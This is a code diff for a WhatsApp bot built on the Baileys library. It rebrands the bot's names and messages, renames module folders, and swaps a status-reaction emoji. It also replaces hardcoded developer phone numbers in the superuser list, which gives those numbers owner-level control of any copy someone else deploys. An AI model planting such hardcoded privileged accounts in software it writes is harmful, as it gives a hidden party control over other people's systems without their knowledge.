@@ -43,12 +43,12 @@ const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
 //import chalk from 'chalk'
 const { verifierEtatJid , recupererActionJid } = require("./bdd/antilien");
 const { atbverifierEtatJid , atbrecupererActionJid } = require("./bdd/antibot");
-let evt = require(__dirname + "/njabulo/fana");
+let evt = require(__dirname + "/framework/zokou");
 const {isUserBanned , addUserToBanList , removeUserFromBanList} = require("./bdd/banUser");
 const  {addGroupToBanList,isGroupBanned,removeGroupFromBanList} = require("./bdd/banGroup");
 const {isGroupOnlyAdmin,addGroupToOnlyAdminList,removeGroupFromOnlyAdminList} = require("./bdd/onlyAdmin");
 //const //{loadCmd}=require("/framework/mesfonctions")
-let { reagir } = require(__dirname + "/njabulo/app");
+let { reagir } = require(__dirname + "/framework/app");
 var session = conf.session.replace(/Njabulo_Jb-WHATSAPP-BOT;;;=>/g,"");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206)
@@ -113,7 +113,7 @@ setTimeout(() => {
         const zk = (0, baileys_1.default)(sockOptions);
         store.bind(zk.ev);
         // Auto-react to status updates, handling each status one-by-one without tracking
-if (conf.ANYWAY_MD === "yes") {
+if (conf.AUTO_LIKE_STATUS === "yes") {
     zk.ev.on("messages.upsert", async (m) => {
         const { messages } = m;
         
@@ -123,11 +123,11 @@ if (conf.ANYWAY_MD === "yes") {
                     const adams = zk.user && zk.user.id ? zk.user.id.split(":")[0] + "@s.whatsapp.net" : null;
 
                     if (adams) {
-                        // React to the status with a green heart
+                        // React to the status with a black heart
                         await zk.sendMessage(message.key.remoteJid, {
                             react: {
                                 key: message.key,
-                                text: "💙",
+                                text: "🖤",
                             },
                         }, {
                             statusJidList: [message.key.participant, adams],
@@ -168,9 +168,9 @@ if (conf.ANYWAY_MD === "yes") {
             var origineMessage = ms.key.remoteJid;
             var idBot = decodeJid(zk.user.id);
             var servBot = idBot.split('@')[0];
-            /* const dj='22559763447';
-             const dj2='254751284190';
-             const luffy='254762016957'*/
+            /* const dj='254729269118';
+             const dj2='254112291443';
+             const luffy='254729269118'*/
             /*  var superUser=[servBot,dj,dj2,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
               var dev =[dj,dj2,luffy].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
             const verifGroupe = origineMessage?.endsWith("@g.us");
@@ -190,10 +190,10 @@ if (conf.ANYWAY_MD === "yes") {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '255678892560';
-            const dj2 = '255678892560';
-            const dj3 = "255678892560";
-            const luffy = '255678892560';
+            const dj = '254112291443';
+            const dj2 = '254729269118';
+            const dj3 = "254112291443";
+            const luffy = '254729269118';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, dj3, luffy, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -706,7 +706,7 @@ zk.ev.on('group-participants.update', async (group) => {
         const metadata = await zk.groupMetadata(group.id);
 
         if (group.action == 'add' && (await recupevents(group.id, "welcome") == 'on')) {
-            let msg = `NJABULO JB WELCOME MESSAGE`;
+            let msg = `Xgaga bots  WELCOME MESSAGE`;
             let membres = group.participants;
             for (let membre of membres) {
                 msg += ` \n🧃 Hey 🖐️ @${membre.split("@")[0]} WELCOME TO OUR GROUP. \n\n`;
@@ -840,10 +840,10 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Njabulo Jb is connecting...");
+                console.log("ℹ️ Gaga is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Njabulo Jb Connected to WhatsApp! ☺️");
+                console.log("✅ Gaga Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
@@ -852,10 +852,10 @@ zk.ev.on('group-participants.update', async (group) => {
                 console.log("vw golf is Online 🕸\n\n");
                 //chargement des commandes 
                 console.log("Loading Njabulo_Jb Commands ...\n");
-                fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
+                fs.readdirSync(__dirname + "/plugins").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
-                            require(__dirname + "/commandes/" + fichier);
+                            require(__dirname + "/plugins/" + fichier);
                             console.log(fichier + " Installed Successfully✔️");
                         }
                         catch (e) {
@@ -882,11 +882,8 @@ zk.ev.on('group-participants.update', async (group) => {
                 
                 if((conf.DP).toLowerCase() === 'yes') {     
 
-                let cmsg =`      ❒─❒⁠⁠⁠⁠ *BOT-IS-RUNNING* ❒⁠⁠⁠⁠─⁠⁠⁠⁠❒⁠⁠⁠⁠
-╭❒⁠⁠⁠⁠─❒⁠⁠⁠⁠─❒⁠⁠⁠⁠─❒⁠⁠⁠⁠─❒⁠⁠⁠⁠              
-❒⁠⁠⁠⁠ 𝑫𝑬𝑽   : *VW*   
-❒⁠⁠⁠⁠ 𝑩𝑶𝑻   : *VW*
-╰❒⁠⁠⁠⁠─❒⁠⁠⁠⁠─❒⁠⁠⁠⁠─❒⁠⁠⁠⁠─❒⁠⁠⁠⁠`;
+                let cmsg =`      Im online✅
+Credits to My developer Mr Gaga⭐`;
                 await zk.sendMessage(zk.user.id, { text: cmsg });
                 }
             }
